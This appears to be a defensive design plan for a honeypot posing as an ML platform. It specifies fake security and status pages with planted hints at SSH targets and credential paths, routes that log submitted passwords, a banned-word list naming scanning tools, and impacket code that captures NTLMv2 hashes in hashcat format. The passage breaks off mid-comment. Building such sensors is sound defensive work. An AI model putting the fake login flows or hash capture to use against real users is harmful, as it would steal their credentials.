Two new templates. Both extend `base.html` and follow the exact visual pattern of `settings_profile.html` and `notifications.html`: dark theme, indigo accents (`rgba(6,192,216,...)` / `rgba(155,89,255,...)`), `bg-surface` cards, `border-border` borders, `text-faint` / `text-muted` hierarchy, `font-mono` for technical values, Tailwind utility classes for layout.

Deception vocabulary gate: no template or JS in these pages may contain `attacker`, `honeypot`, `bypass`, `scanner`, `botScore`, `canvasFingerprint`, `bot_score`, `canvas_fp`, `getCanvasFingerprint`, `viewSourceAttempts`, `sqlmap`, `nikto`, `nmap`, `zgrab`, `nuclei`, `masscan`, `Puppeteer`, `Playwright`, `plans.md`, or `credential stuffing`. All vocabulary is ML platform production language.

---

### `/settings/security` — Design Specification

**Legend context**: An ML platform admin settings page. Ming Chen (`m.chen`) is an ML Engineer with two-factor auth already enabled. Other team members are logged in concurrently from known IPs. The IP allowlist and API key rotation surface are the primary high-value lures.

**Session gate**: Yes — `nro_session` cookie required, else `RedirectResponse(url="/", status_code=302)`.

**Sidebar active entry**: Add `Security` link under the existing **System** section, between `Notifications` and the bottom of the nav, using the same link style. Active state uses the gradient background pattern seen in `notifications.html` when `/notifications` is the current page.

```html
<a href="/settings/security" style="display:flex;align-items:center;gap:10px;padding:7px 10px;
  border-radius:9px;font-size:13.5px;font-weight:500;color:#ffffff;
  background:linear-gradient(135deg,rgba(6,192,216,0.12),rgba(155,89,255,0.12));
  border:1px solid rgba(6,192,216,0.15);text-decoration:none;width:100%;
  box-sizing:border-box;white-space:nowrap;overflow:hidden;">
  <!-- shield icon -->
  <span class="nb-label">Security</span>
</a>
```

On all other pages the Security link appears as inactive (same hover style as all other nav links).

**User popup addition**: Add `Security` as a new item directly above `Profile` in the user popup dropdown, same style as existing popup items, linking to `/settings/security`. This increases exposure — attackers who open the popup to explore identity options will see it.

---

#### Card 1 — Two-Factor Authentication

Visual: `bg-surface border border-border rounded-xl p-5`. Header: `TWO-FACTOR AUTHENTICATION` in uppercase tracking-widest text-faint. Right side: green badge `Enabled`.

Content:
- Current method: `TOTP (Google Authenticator)` — shown as a monospace pill
- Recovery codes: `8 codes remaining` (text-faint, font-mono)
- "Disable for maintenance window" button — amber/yellow styling (`bg-yellow-500/10 border border-yellow-500/25 text-yellow-300`), label `Disable 2FA (24h)`, disabled attribute absent (button is fully clickable)
- Small print below button: `Disabling 2FA requires re-authentication within 24 hours. Audit log entry created.`

On click, the button fires a `fetch` POST to `/api/v1/security/mfa/toggle` and immediately shows a modal/inline confirmation: `"Disable 2FA? This action is logged and requires your password."` with a password input field and Confirm button. The Confirm button also POSTs to `/api/v1/security/mfa/toggle` with the submitted password value — the backend logs the submitted value as `payload.attempted_password` via `_log_event()`.

Telemetry beacon on button click (before any modal):
```javascript
fetch('/api/v1/telemetry', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    type: 'security_mfa_disable_click',
    page: 'settings_security',
    ts: Date.now()
  })
}).catch(function(){});
```

Telemetry beacon on Confirm (password submission):
```javascript
fetch('/api/v1/telemetry', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    type: 'security_mfa_confirm',
    has_input: passwordField.value.length > 0,
    ts: Date.now()
  })
}).catch(function(){});
```

---

#### Card 2 — Active Sessions

Visual: same card style. Header: `ACTIVE SESSIONS`. Right side: `3 sessions` badge (indigo).

Table with three rows (no real `<table>` — use flex rows for visual consistency with the rest of the system):

| Identity | Device / Agent | Source IP | Location | Last active |
|---|---|---|---|---|
| `m.chen@neuro.ai` (you) | MacBook Pro — Chrome 124 | `192.168.1.45` | San Francisco, CA | Just now |
| `m.chen@neuro.ai` | neuro-train-01 automation | `10.31.4.22` | Internal | 4 min ago |
| `priya.nair@neuro.ai` | MacBook Air — Safari 17 | `192.168.1.48` | San Francisco, CA | 12 min ago |

Row for `svc-deploy`/`10.31.4.22` should show device label `neuro-train-01 automation` with font-mono styling — this is the same IP referenced in `/api/v1/cluster/nodes`, reinforcing the kill-chain bridge.

Each row has a `Revoke` button on the right, styled in red (`text-red-400 hover:text-red-300`). Clicking Revoke fires `POST /api/v1/security/session/revoke` with `{"session_ref": "<row_id>"}`, then removes the row from the DOM with a fade. The backend logs the action as `security.session_revoke_attempt` with the `session_ref` value.

On page load, fire a single beacon for all three sessions (not per-row) to avoid beacon flood:
```javascript
fetch('/api/v1/telemetry', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    type: 'security_sessions_viewed',
    session_count: 3,
    ts: Date.now()
  })
}).catch(function(){});
```

HTML lure comment directly above the sessions card (visible in view-source):
```html
<!-- active session tokens are short-lived JWTs; refresh endpoint: POST /api/v1/auth/token/refresh -->
<!-- svc-deploy token rotated every 6h via cron on neuro-train-01.internal — see /etc/cron.d/neuro-token-refresh -->
```

---

#### Card 3 — IP Allowlist

Visual: same card style. Header: `IP ACCESS ALLOWLIST`. Right side: `3 entries` badge.

Current entries displayed as a list:

```
10.31.4.0/24        Internal cluster network       Active    [Remove]
192.168.1.0/24      Office (SF HQ)                 Active    [Remove]
0.0.0.0/0           Global access (disabled)       Disabled  [Enable]
```

Each entry is a flex row: CIDR in `font-mono text-gray-200`, label in `text-faint`, status badge, and action button.

The `0.0.0.0/0` row has a yellow/amber `Disabled` badge and an `Enable` button. Clicking Enable fires telemetry `security_allowlist_enable_global` and shows inline warning: `"Enabling global access removes IP restrictions for all users. Confirm?"`. This is a strong lure for attackers who want to remove access controls — the action signals intent clearly.

"Add CIDR" form below the list: single text input (`placeholder="10.0.0.0/8 or 203.0.113.5/32"`) with an Add button. Submission fires:
1. Telemetry beacon `security_allowlist_add_attempt` with the submitted value (hashed length, not raw — to avoid leaking beacon value to network observers; raw value goes in the POST to the backend)
2. `POST /api/v1/security/allowlist/add` with `{"cidr": "<value>", "label": "<label_value>"}` — backend logs the submitted CIDR as a `security.allowlist_probe` event via `_log_event()`
3. On backend 200 response, add a new row to the DOM showing the submitted CIDR as `Active`

Backend response for `/api/v1/security/allowlist/add`:
```json
{"ok": true, "entries": 4, "cidr": "<submitted>", "effective_at": "immediately"}
```

HTML lure comment above the allowlist card:
```html
<!-- allowlist enforced at nginx layer via geo module; reload: docker exec nginx openresty -s reload -->
<!-- backup bypass (break-glass): remove allowlist env var NEURO_IP_ALLOWLIST_ENABLED from .env and restart -->
```

---

#### Card 4 — API Key Rotation Policy

Visual: same card style. Header: `KEY ROTATION POLICY`.

Content:
- Current policy: `Every 90 days (manual)` — text-gray-200
- Last rotation: `2026-03-15 by priya.nair` — font-mono text-faint
- Next scheduled: `2026-06-13` — font-mono, shown in yellow if within 14 days (it is, since today is 2026-06-05)
- "Rotate All Keys Now" button — indigo styling, full width

On click, "Rotate All Keys Now" fires:
1. Telemetry beacon `security_key_rotation_click`
2. `POST /api/v1/security/keys/rotate` — backend emits `security.key_rotation_attempt`, returns:
```json
{
  "rotated": true,
  "count": 4,
  "new_prefix": "nro-",
  "sample_key": "nro-7f3a2c9e1b4d8f0a",
  "effective_at": "2026-06-05T00:00:00Z",
  "note": "Old keys invalidated. Update CI/CD pipelines and Cowrie automation scripts."
}
```

The response JSON is displayed inline below the button in a `bg-elevated rounded-lg p-3 font-mono text-xs` block. The `note` field references `Cowrie automation scripts` — an in-universe breadcrumb.

---

#### Card 5 — Audit Log (last 5 entries)

Visual: same card style. Header: `RECENT AUDIT LOG`. Right side: `View full log →` link to `/api/v1/security/audit-log` (new backend route, returns JSON of 20 entries).

Five entries displayed as flex rows with timestamp, actor, action, and source IP. Use fixture values consistent with existing data:

```
2026-06-04 22:09 UTC  m.chen@neuro.ai        Login success          192.168.1.45
2026-06-04 18:31 UTC  priya.nair@neuro.ai     API key created        192.168.1.48
2026-06-04 09:14 UTC  m.chen@neuro.ai        Login success          192.168.1.45
2026-06-03 03:14 UTC  m.chen@neuro.ai        SSH key used           185.234.219.4  [!]
2026-06-02 16:44 UTC  svc-deploy             Token refreshed        10.31.4.22
```

The `185.234.219.4` row has a yellow warning icon `[!]` badge labeled `Unusual IP` — same narrative as the existing notification `n-006` in `notifications.html` (which also references this IP and time). This cross-page consistency reinforces legend believability.

No per-row telemetry beacon. The `/api/v1/security/audit-log` JSON endpoint click fires a `security_audit_log_viewed` beacon in its own handler.

---

#### Telemetry Summary — `/settings/security`

All beacons use `fetch('/api/v1/telemetry', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({...})}).catch(function(){})`.

| Trigger | `type` value | Extra fields |
|---|---|---|
| Page load | `page_view` | `page: 'settings_security'` |
| Page load (passive) | `security_sessions_viewed` | `session_count: 3` |
| MFA disable button click | `security_mfa_disable_click` | — |
| MFA confirm submit | `security_mfa_confirm` | `has_input: bool` |
| Session revoke click | `security_session_revoke_click` | `session_ref: str` |
| Enable global allowlist click | `security_allowlist_enable_global` | — |
| Add CIDR submit | `security_allowlist_add_attempt` | `cidr_length: int` |
| Key rotation click | `security_key_rotation_click` | — |
| `pagehide` | `security_page_exit` | `dwell_ms: int` |

---

#### Backend Routes — `/settings/security`

**`GET /settings/security`** (session-gated):
```python
@app.get("/settings/security")
async def settings_security_page(request: Request):
    if not _session_ok(request):
        return RedirectResponse(url="/", status_code=302)
    await _log_event(request, "http.get.settings_security", {})
    return templates.TemplateResponse("settings_security.html", {
        "request": request, "active_page": "security"
    })
```

**`POST /api/v1/security/mfa/toggle`** (session-gated):
- Reads `{"attempted_password": "..."}` from request body
- Logs `security.mfa_toggle_attempt` event via `_log_event()` with `payload.attempted_password` stored
- Returns `{"ok": true, "mfa_enabled": true, "message": "2FA status unchanged — re-authentication required via identity provider."}`
- Add to `_LURE_PATHS`

**`POST /api/v1/security/session/revoke`** (session-gated):
- Reads `{"session_ref": "..."}` from body
- Logs `security.session_revoke_attempt` via `_log_event()` with `session_ref` in payload
- Returns `{"ok": true, "revoked": true, "session_ref": "<value>"}`
- Add to `_LURE_PATHS`

**`POST /api/v1/security/allowlist/add`** (session-gated):
- Reads `{"cidr": "...", "label": "..."}` from body
- Logs `security.allowlist_probe` via `_log_event()` with submitted CIDR in payload — this captures attacker's own IP block or internal network CIDR
- Returns `{"ok": true, "entries": 4, "cidr": "<submitted>", "effective_at": "immediately"}`
- Add to `_LURE_PATHS`

**`POST /api/v1/security/keys/rotate`** (session-gated):
- Logs `security.key_rotation_attempt` via `_log_event()`
- Returns the JSON response block described in Card 4
- Add to `_LURE_PATHS`

**`GET /api/v1/security/audit-log`** (session-gated):
- Logs `security.audit_log_viewed` via `_log_event()`
- Returns JSON array of 20 audit entries (fixture data — same IPs/actors as the 5 shown in template)
- Add to `_LURE_PATHS`

---

### `/status` — Design Specification

**Legend context**: A public-facing system status page. Common on real SaaS platforms. Deliberately NOT session-gated — scanners and unauthenticated recon tools see it without any login, maximising exposure of the internal hostname lures and service health data. The page URL is referenced in the footer of `base.html` (`Status` link), so authenticated users browsing the platform encounter it naturally, but it is also indexable by bots.

**Session gate**: None — public page. All visitors (including unauthenticated) are logged and beaconed.

**No sidebar**: Status pages on real SaaS platforms (e.g. statuspage.io) do not have the app navigation sidebar. This is a standalone page with a minimal header — `logo + "System Status" + last-updated timestamp`. Extending `base.html` is still correct for `{% block scripts %}` and `{% block styles %}` inheritance, but `{% block body %}` renders a standalone layout without the sidebar `<aside>`.

**Page load telemetry**: Fires immediately on `DOMContentLoaded`. Includes `document.referrer` to capture whether the visitor came from a search engine, the app footer, or a direct URL (recon probe vs. legitimate navigation).

---

#### Header / Overall Status Banner

Full-width banner at top of page. Background: `bg-green-500/10 border border-green-500/20`. Content: large green checkmark icon, bold text `All Systems Operational`, sub-text `Last updated: <current ISO timestamp>` in font-mono.

The timestamp is rendered static in the HTML (not JS-driven) as `2026-06-04T23:47:02Z` — a recent but not live value. This is consistent with how a real status page works (updated on state change, not every second).

---

#### Service Cards (4 cards, 2×2 grid on wider viewports, 1 column on narrow)

Each card: `bg-surface border border-border rounded-xl p-5`. Title row: service name (bold, white) + status badge on right. Body: metric rows in `font-mono text-xs` pairs (label `text-faint`, value `text-gray-200`).

**Card 1 — Training API**

Status badge: `Operational` (green)

Metrics:
- Uptime (30d): `99.97%`
- Avg latency: `142 ms`
- Active jobs: `3`
- Version: `v2.3.1`
- Endpoint: `https://neuro.cyveera.com/api/v1`

On card hover: fires `status.service_viewed` beacon with `service: 'training_api'`. Use `mouseenter` event on the card element.

**Card 2 — GPU Cluster**

Status badge: `Operational` (green)

Metrics:
- Node: `neuro-train-01.internal`
- GPUs active: `8 / 8`
- VRAM utilisation: `87%` (shown with a small progress-bar-style indicator in amber because 87% is visually significant)
- Driver: `CUDA 12.4 / Driver 550.54.14`
- Interconnect: `NVLink 4.0`
- Management: `SSH: neuro-svc@neuro-train-01.internal`

The `SSH: neuro-svc@neuro-train-01.internal` value is rendered in `font-mono text-indigo-300` — visually elevated so it reads like a clickable/copyable value. No actual click handler — the elevated color alone is the lure. An attacker reading this page will see the SSH target and credentials in plain sight.

On card hover: fires `status.service_viewed` with `service: 'gpu_cluster'`.

HTML comment below this card (visible in view-source):
```html
<!-- internal: neuro-train-01.internal:8080 health endpoint → GET /api/v1/cluster/health -->
<!-- SSH jump host not required; direct access via 10.31.4.22 port 22 (neuro-svc credentials in /etc/neuro/deploy.conf) -->
```

**Card 3 — Data Pipeline**

Status badge: `Operational` (green)

Metrics:
- Last job completed: `4 min ago`
- Jobs processed (24h): `47`
- Data ingested today: `1.2 TB`
- Storage backend: `s3://neuro-ml-artifacts`
- Queue depth: `2 jobs pending`
- Worker nodes: `neuro-train-01.internal, neuro-train-02.internal`

On card hover: fires `status.service_viewed` with `service: 'data_pipeline'`.

**Card 4 — Auth Service**

Status badge: `Operational` (green)

Metrics:
- Provider: `Google Workspace OIDC`
- Token endpoint: `https://accounts.google.com/o/oauth2/token`
- SSO issuer: `neuro.cyveera.com`
- Uptime (30d): `100%`
- Session duration: `8h (configurable)`
- Service account: `svc-deploy@neuro.cyveera.com`

The `svc-deploy@neuro.cyveera.com` value in font-mono is a lure — same persona as the `svc-deploy` SSH/automation user referenced throughout the platform. Seeing this on the status page alongside `100% uptime` and the token endpoint makes it appear operational and relevant.

On card hover: fires `status.service_viewed` with `service: 'auth_service'`.

HTML comment above the Auth card:
```html
<!-- TODO: remove svc-deploy credentials from deploy config before prod — priya.nair @ 2026-04-10 -->
<!-- OIDC callback registered: https://neuro.cyveera.com/api/v1/auth/sso/callback -->
```

---

#### Incident History Section

Below the service cards: `INCIDENT HISTORY` section header. Three rows showing past incidents, styled as a simple list with date, title, and resolved badge.

```
2026-05-28  GPU node neuro-train-01 memory fault — resolved in 47 min   [Resolved]
2026-05-14  Data pipeline queue backup — resolved in 2h 12 min           [Resolved]
2026-04-29  Auth service elevated latency (Google OIDC upstream)         [Resolved]
```

No telemetry on incident row clicks — adding hover beacons here would create disproportionate noise from legitimate crawlers.

---

#### Telemetry Summary — `/status`

| Trigger | `type` value | Extra fields |
|---|---|---|
| Page load | `page_view` | `page: 'status', referrer: document.referrer` |
| Card mouseenter | `status_service_viewed` | `service: '<name>'` |
| `pagehide` | `status_page_exit` | `dwell_ms: int` |

**Note on pagehide for `/status`**: Because the page is public and will receive scanner traffic, the `pagehide` beacon will fire for every bot that loads and immediately leaves. This is acceptable — the `dwell_ms` distribution itself is a useful signal (< 200ms = scanner, > 5000ms = human reader).

---

#### Backend Route — `/status`

**`GET /status`** (no session gate):
```python
@app.get("/status")
async def status_page(request: Request):
    # Public — no session check
    await _log_event(request, "http.get.status", {})
    return templates.TemplateResponse("status.html", {"request": request})
```

Add to `_LURE_PATHS` so `X-Debug-Mode: enabled` header is suppressed here (status pages in production never expose debug headers).

The footer `Status` link in `base.html` already points to `/status` per the P2-13 footer that was added in Session 1. No footer change needed.

---

### Sidebar Navigation Changes (Both Pages)

Add two links to the **System** section of the sidebar in ALL 14 templates. Current System section has only `Notifications`. New order:

```
System
  Notifications
  Security            ← new (link: /settings/security)
  Status              ← new (link: /status)
```

The `Security` link uses a shield SVG icon. The `Status` link uses a signal/wifi SVG icon (or a simple circle-dot). Both use the standard inactive link style on all pages except their own active page.

Because the sidebar is duplicated inline (not via Jinja2 include — `base.html` does not define a sidebar block), all 14 templates must be updated individually. This is the same work pattern as all prior sidebar updates.

**Active class rules**:
- `settings_security.html`: Security link gets active gradient style; all others inactive
- `status.html`: Status link gets active gradient style; all others inactive

---

### User Popup Addition

Add `Security` item to the user popup dropdown in ALL 14 templates, positioned between `API Keys` and `Profile`:

```html
<a href="/settings/security" style="display:flex;align-items:center;gap:8px;padding:8px 12px;
  border-radius:8px;font-size:13px;color:var(--c-muted);text-decoration:none;transition:all 0.1s;"
  onmouseover="this.style.background='var(--c-elevated)';this.style.color='#E2E8F0'"
  onmouseout="this.style.background='transparent';this.style.color='var(--c-muted)'">
  <!-- shield icon 13×13 -->
  Security
</a>
<div style="height:1px;background:var(--c-border);margin:4px 8px;"></div>
```

This surfaces the Security page to every authenticated attacker who explores the user popup, regardless of which page they are on.

---

### Self-Assessment — What Might Reveal These as Lures

**`/settings/security` risks**:
- The MFA disable password field sending a `POST` to an unauthenticated endpoint is technically suspicious (real 2FA disable flows use a re-auth redirect, not a modal POST). Mitigation: ensure the POST endpoint returns a `401`-equivalent message body (`"re-authentication required via identity provider"`) rather than a success, so the flow feels incomplete but not obviously fake.
- Session table shows only three rows. A real platform used by a small team would plausibly have 2–5. Acceptable. If zero rows appeared it would be a stronger tell.
- The CIDR "Add" form accepting any input and immediately showing the submitted value as `Active` without any asynchronous validation delay feels instant. Mitigation: add a 400–700ms artificial delay before the DOM update (use `setTimeout`) to simulate a backend call completing.

**`/status` risks**:
- The `SSH: neuro-svc@neuro-train-01.internal` field in the GPU card is unusually explicit for a status page. Real status pages show service health, not credential hints. To reduce suspicion: label it `Management access` rather than `SSH:` prefix directly, and move the credential path to the HTML comment instead of the visible card body. The lure value is equivalent — view-source reveals it either way — but the card reads more like a legitimate `ops runbook` reference.
- The `svc-deploy@neuro.cyveera.com` service account on a status page is plausible for a "service account" row under Auth Service — service accounts appearing on status pages is a real pattern (e.g., Google Cloud service health pages).
- The incident history dates reference `neuro-train-01 memory fault` (2026-05-28) which is consistent with the GPU cluster fixture data and the existing notification `n-004` (deployment OOM). Good cross-page consistency.

---

### Implementation Checklist

```
[ ] Create frontend-latest/settings_security.html — 5 cards, all telemetry beacons
[ ] Create frontend-latest/status.html — standalone layout (no sidebar), 4 cards + incident history
[ ] Update frontend-latest/*.html (all 14 templates) — add Security + Status to sidebar System section
[ ] Update frontend-latest/*.html (all 14 templates) — add Security to user popup dropdown
[ ] Add main.py routes:
    [ ] GET /settings/security (session-gated)
    [ ] POST /api/v1/security/mfa/toggle (session-gated, logs attempted_password)
    [ ] POST /api/v1/security/session/revoke (session-gated, logs session_ref)
    [ ] POST /api/v1/security/allowlist/add (session-gated, logs submitted CIDR)
    [ ] POST /api/v1/security/keys/rotate (session-gated)
    [ ] GET /api/v1/security/audit-log (session-gated, JSON fixture)
    [ ] GET /status (no session gate)
[ ] Add all new routes to _LURE_PATHS in main.py
[ ] Deploy: SCP 16 updated templates to VPS, rebuild honeypot-api container
[ ] Verify: deception vocabulary grep returns zero matches
[ ] Verify: curl -s http://127.0.0.1:8080/status returns 200 without nro_session cookie
[ ] Verify: curl -s http://127.0.0.1:8080/settings/security without cookie returns 302
[ ] Verify: POST /api/v1/security/allowlist/add logs event in honeypot_events table
```

**Estimated effort**: 5h total (2.5h frontend, 1h backend routes, 1h sidebar/popup propagation across 14 templates, 0.5h verify)

---

## Module 9 — SMB Sensor (impacket)

**Status**: DESIGN APPROVED (Gatekeeper Round 28 CONDITIONAL) — ready for implementation.

### 1. Architecture Decision

**Why impacket, not OpenCanary SMB**:
OpenCanary's `smb.enabled: true` requires a running `smbd` (Samba) process with `vfs objects = full_audit` in `smb.conf` for event capture. The OpenCanary Dockerfile contains no Samba installation. The result is a port 445 listener that completes no SMB negotiation — `smbclient -L` hangs then returns `NT_STATUS_CONNECTION_REFUSED`. Any scanner with Shodan/Censys knowledge or a single `nmap -sV` probe identifies this as a dark port, which is a stronger fingerprint tell than having no SMB at all. The port 445 DNAT was reverted (CRIT-R28-1) and a revert comment added to `honeypot-dnat.sh`.

**impacket approach**: impacket's `smbserver` module (`impacket.smbserver.SimpleSMBServer`) is a pure-Python SMB2/NTLM implementation that runs without Samba. It completes real SMB negotiation, responds to `smbclient -L`, and captures NTLMv2 challenge/response hashes from connecting clients — including from tools like `crackmapexec`, `Responder`, and Windows Explorer UNC paths. No dependency on `smbd`.

**Container assignment**:
- Container name: `smb-lure`
- Container IP: `10.10.20.10` (next free on `honeypot-net` 10.10.20.0/24)
- Listening port: `445/tcp` (standard SMB — cannot use an alternate port; Windows clients hard-code 445)
- Network: `honeypot-net` (external: true, internal: false) — same as all other lure containers
- Host port binding: none — DNAT at the `honeypot-dnat` nft table handles external exposure

**What this sensor captures that no other sensor does**:
1. **NTLMv2 hashes** — when Windows tools or crackmapexec probe port 445, SMB NTLM challenge/response is exchanged. The NTLMv2 hash is crackable offline with hashcat. This is the highest-value credential surface for Windows-based attackers.
2. **Windows malware drops** — lateral movement malware (e.g. Mimikatz drops, ransomware staging) uses SMB to copy executables to `\\server\share`. The write attempt is captured even though the write is faked.
3. **Share enumeration** — `net view \\host`, `smbclient -L`, `nmap --script smb-enum-shares` all trigger `smb.enum.shares` events.
4. **Pipe connections** (RPC calls) — tools like `rpcclient`, `enum4linux`, BloodHound ingestor use named pipes over SMB for user/group enumeration. These appear as `smb.pipe.connect` events.

---

### 2. File Tree

```
deploy/module-9-smb-lure/
├── Dockerfile
├── docker-compose.yml
├── .env.example
├── smb_server.py          # main impacket SMB server process
├── verify-module-9.sh     # 5-point verification checklist
└── README.md              # operator notes (cover story, kill-chain wiring)
```

Log volume (shared with log-shipper):
```
/opt/honeypot/config/smb/              # host config dir — lure files placed here
smb-logs (Docker named volume)         # JSON event log written by smb_server.py,
                                       # tailed read-only by log-shipper
```

---

### 3. Dockerfile

```dockerfile
FROM python:3.11-slim

# impacket 0.12.0 — pinned for reproducibility. Contains smbserver module,
# ntlm challenge/response parsing, and DCERPC pipe handling.
# cryptography and pyOpenSSL are impacket hard deps.
RUN pip install --no-cache-dir \
    impacket==0.12.0 \
    cryptography==42.0.8 \
    pyOpenSSL==24.1.0

WORKDIR /app
COPY smb_server.py /app/smb_server.py

# Pre-compile to catch import errors at build time (same pattern as honeypot-api)
RUN python3 -m py_compile /app/smb_server.py

# Non-root user — SMB on port 445 requires CAP_NET_BIND_SERVICE, not root.
# The capability is added in docker-compose.yml, not here.
RUN useradd -r -s /bin/false smbsvc
USER smbsvc

CMD ["python3", "/app/smb_server.py"]
```

**Why `python:3.11-slim`**: Matches the base Python version of `honeypot-api` and `log-shipper`. `slim` minimises the attack surface if the container is ever escaped. impacket 0.12.0 is the latest stable release as of June 2026.

**`CAP_NET_BIND_SERVICE`**: Binding to port 445 (< 1024) requires this capability even for non-root users. Added in docker-compose.yml via `cap_add`. All other capabilities are dropped via `cap_drop: ALL`.

---

### 4. docker-compose.yml

```yaml
# Module 9 — smb-lure (impacket SMB honeypot)
# Standalone compose for independent deployment and verification.
# Run from /opt/honeypot/deploy/module-9-smb-lure/
#
# OPERATOR PREREQUISITES (do not skip):
#   1. Modules 1-5 verified (data-net, honeypot-net, log-shipper all running)
#   2. mkdir -p /opt/honeypot/config/smb
#   3. cp .env.example .env && chmod 600 .env
#   4. Pre-create log file:
#        touch /opt/honeypot/config/smb/smb.json && chmod 666 /opt/honeypot/config/smb/smb.json
#   5. docker compose up -d --build
#   6. Add DNAT + FORWARD rules (see Section 7 of this plan), restart honeypot-dnat.service
#   7. Open port 445 at Contabo provider firewall panel
#   8. bash verify-module-9.sh

networks:
  honeypot-net:
    external: true
    name: honeypot-net    # created by Module 2; joining only

volumes:
  smb-logs:
    name: smb-logs        # canonical name — tailed read-only by log-shipper

services:
  smb-lure:
    build: .
    container_name: smb-lure
    restart: on-failure:5
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE   # required to bind port 445 (< 1024) as non-root
    networks:
      honeypot-net:
        ipv4_address: 10.10.20.10   # pinned — DNAT rule targets this IP exactly
    # No host port binding — internet access via DNAT in honeypot-dnat.sh:
    #   iif "eth0" tcp dport 445 dnat to 10.10.20.10:445
    volumes:
      # JSON event log — tailed read-only by log-shipper (Module 5)
      - smb-logs:/var/log/smb
      # Lure share content — bind-mount so operator can add files without rebuild.
      # Contents appear in directory listings when attacker runs smbclient or net view.
      - /opt/honeypot/config/smb:/share:ro
    env_file:
      - .env
    environment:
      - SMB_LOG=/var/log/smb/smb.json
      - SMB_SHARE_NAME=neuro-data-share
      - SMB_SERVER_NAME=NEURO-TRAIN-01
      - SMB_DOMAIN=NEURO
    mem_limit: 128m
    memswap_limit: 128m
    cpus: "0.25"
    pids_limit: 30
    healthcheck:
      # Port 445 responds to TCP SYN — a successful connect confirms the server is up.
      test: ["CMD", "python3", "-c",
             "import socket; s=socket.socket(); s.settimeout(2); s.connect(('127.0.0.1',445)); s.close()"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 10s
```

**.env.example**:
```
SMB_LOG=/var/log/smb/smb.json
SMB_SHARE_NAME=neuro-data-share
SMB_SERVER_NAME=NEURO-TRAIN-01
SMB_DOMAIN=NEURO
```

---

### 5. impacket SMB Server Core (`smb_server.py`)

The complete file to create at `deploy/module-9-smb-lure/smb_server.py`:

```python
#!/usr/bin/env python3
"""
smb_server.py — impacket-based SMB honeypot for Neuro platform.

Presents a single SMB2 share named neuro-data-share — a plausible
network-attached dataset store for an ML training platform.

Captures:
  - NTLMv2 challenge/response hashes (offline-crackable with hashcat mode 5600)
  - Share enumeration (smbclient -L, net view, nmap smb-enum-shares)
  - File access attempts (read/write/delete)
  - Named pipe connections (rpcclient, enum4linux, BloodHound ingestor)

Log format: newline-delimited JSON written to SMB_LOG, tailed by log-shipper.

impacket classes used:
  impacket.smbserver.SimpleSMBServer   — core SMB2 server
  impacket.ntlm                        — NTLMv2 message parsing
"""

import hashlib
import json
import logging
import os
import signal
import sys
import threading
import uuid
from datetime import datetime, timezone
from pathlib import Path

from impacket import ntlm
from impacket.smbserver import SimpleSMBServer

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
SMB_LOG    = os.environ.get("SMB_LOG",        "/var/log/smb/smb.json")
SHARE_NAME = os.environ.get("SMB_SHARE_NAME", "neuro-data-share")
SERVER_NAME= os.environ.get("SMB_SERVER_NAME","NEURO-TRAIN-01")
DOMAIN     = os.environ.get("SMB_DOMAIN",     "NEURO")
SHARE_PATH = "/share"    # bind-mounted from /opt/honeypot/config/smb
LISTEN_IP  = "0.0.0.0"
LISTEN_PORT= 445

logging.basicConfig(
    stream=sys.stdout,
    level=logging.WARNING,    # impacket is verbose at INFO; suppress its internal noise
    format="%(asctime)s %(levelname)s %(message)s",
)
log = logging.getLogger("smb_lure")

# ---------------------------------------------------------------------------
# Thread-safe JSON event writer
# ---------------------------------------------------------------------------
_log_lock = threading.Lock()


def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _write_event(event: dict) -> None:
    """Append one JSON event to SMB_LOG. Thread-safe — multiple connections may fire concurrently."""
    event.setdefault("timestamp", _now_iso())
    event.setdefault("event_id",  str(uuid.uuid4()))
    try:
        with _log_lock:
            with open(SMB_LOG, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(event) + "\n")
                fh.flush()
    except Exception as exc:
        log.error("smb_log_write_error: %s", exc)


# ---------------------------------------------------------------------------
# NTLMv2 hash extractor
# ---------------------------------------------------------------------------
def _extract_ntlmv2(challenge_bytes: bytes, authenticate_blob: bytes) -> tuple:
    """
    Parse an NTLM AUTHENTICATE_MESSAGE and reconstruct the NTLMv2 hash in
    Hashcat mode 5600 format: username::domain:ServerChallenge:NTProofStr:blob

    Returns (hashcat_hash_str, username_str, domain_str) or (None, "", "")
    if the message is not NTLMv2 or cannot be parsed.

    impacket API:
      ntlm.NTLMAuthChallengeResponse(blob)
        Fields after parsing:
          .get("user_name")     — bytes, UTF-16LE encoded
          .get("domain_name")   — bytes, UTF-16LE encoded
          .get("NTChallengeResponse")  — bytes; first 16 = NTProofStr, rest = blob
    """
    try:
        auth = ntlm.NTLMAuthChallengeResponse(authenticate_blob)
        nt_response = auth.get("NTChallengeResponse") or b""
        if len(nt_response) < 24:
            return None, "", ""   # NTLMv1 — shorter structure, different format

        nt_proof_str = nt_response[:16].hex()
        nt_blob      = nt_response[16:].hex()
        server_chal  = challenge_bytes.hex() if challenge_bytes else "0011223344556677"

        username = (auth.get("user_name") or b"").decode("utf-16-le", errors="replace").strip()
        domain   = (auth.get("domain_name") or b"").decode("utf-16-le", errors="replace").strip()

        hashcat_hash = f"{username}::{domain}:{server_chal}:{nt_proof_str}:{nt_blob}"
        return hashcat_hash, username, domain
    except Exception as exc:
        log.debug("ntlmv2_parse_error: %s", exc)
        return None, "", ""


# ---------------------------------------------------------------------------
# impacket SMB server subclass
# ---------------------------------------------------------------------------
# SimpleSMBServer exposes customisation via subclassing.
#
# Key methods overridden:
#   _authenticateUser(connId, smbServer, recvPacket, SMBCommand, recvSignal)
#     Called for every NTLM AUTHENTICATE_MESSAGE. We intercept here to extract
#     the NTLMv2 hash then call super() which rejects the auth (no password set).
#
# Key impacket API calls used:
#   server.addShare(name, path, comment, readOnly)
#     Registers a share. readOnly=True causes STATUS_ACCESS_DENIED on writes.
#   server.setSMBChallenge(bytes)
#     Overrides the 8-byte server challenge sent in NTLM CHALLENGE_MESSAGE.
#     Must be exactly 8 bytes. We use a static value so hashes can be cracked
